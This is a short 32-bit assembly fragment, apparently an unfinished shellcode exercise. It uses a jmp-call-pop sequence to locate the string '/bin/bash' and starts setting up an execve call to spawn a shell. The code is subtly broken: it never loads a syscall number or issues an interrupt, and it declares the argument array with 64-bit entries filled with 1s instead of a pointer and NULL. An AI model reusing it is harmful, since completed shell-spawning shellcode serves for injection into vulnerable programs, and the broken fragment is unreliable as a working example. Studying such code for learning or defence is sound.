bits 32

jmp pre_args

run:
	; int kernel_execve(const char *filename, const char *const argv[], const char *const envp[]);
	pop ebx
  lea ecx, [ebx + 10]
  mov edx, 0

	; args should contains [shell, NULL]

pre_args:
	call run

	filename db '/bin/bash',0
	args times 2 dq 1

exit:
